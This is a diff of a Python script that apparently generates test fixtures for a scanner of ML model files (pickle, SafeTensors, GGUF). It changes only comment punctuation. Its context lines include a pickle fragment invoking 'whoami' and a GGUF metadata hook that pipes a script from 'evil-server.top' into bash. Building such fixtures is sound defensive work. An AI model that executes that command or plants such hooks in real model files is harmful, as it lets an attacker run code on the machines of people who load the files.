@@ -89,7 +89,7 @@ def create_corrupted_pickle():
         b"\x8c\x06whoami"
         b"\x85"
         b"R"
-        # No STOP — truncated
+        # No STOP  --  truncated
         b"\xff\xff\xff"  # Garbage bytes
     )
     path = os.path.join(FIXTURES_DIR, "corrupted_with_globals.pkl")
@@ -187,7 +187,7 @@ def create_oversized_safetensors_header():
 
 
 def create_malformed_safetensors():
-    """Invalid SafeTensors — header size exceeds file."""
+    """Invalid SafeTensors  --  header size exceeds file."""
     # Claim 1MB header but file is tiny
     header_size = struct.pack("<Q", 1_000_000)
     path = os.path.join(FIXTURES_DIR, "malformed.safetensors")
@@ -242,7 +242,7 @@ def create_malicious_gguf():
         f.write(struct.pack("<I", 8))
         _write_gguf_string(f, "llama")
 
-        # KV 2: suspicious — hidden C2 URL
+        # KV 2: suspicious  --  hidden C2 URL
         _write_gguf_string(f, "custom.post_load_hook")
         f.write(struct.pack("<I", 8))
         _write_gguf_string(f, "curl https://evil-server.top/backdoor.sh | bash")
@@ -250,7 +250,7 @@ def create_malicious_gguf():
 
 
 def create_malformed_gguf():
-    """Invalid GGUF — wrong magic number."""
+    """Invalid GGUF  --  wrong magic number."""
     path = os.path.join(FIXTURES_DIR, "malformed.gguf")
     with open(path, "wb") as f:
         f.write(b"BAAD")  # Wrong magic
